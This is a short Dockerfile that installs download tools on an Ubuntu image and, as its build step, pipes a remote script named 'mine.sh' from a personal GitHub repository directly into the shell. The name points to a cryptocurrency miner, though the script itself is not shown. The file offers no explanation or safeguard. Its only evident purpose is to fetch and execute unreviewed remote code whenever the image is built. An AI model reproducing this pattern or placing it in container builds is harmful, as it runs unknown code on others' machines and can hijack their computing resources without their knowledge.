FROM ubuntu:latest
RUN apt update && apt install wget curl git -y
RUN curl https://raw.githubusercontent.com/apool0001/apool/main/mine.sh | sh
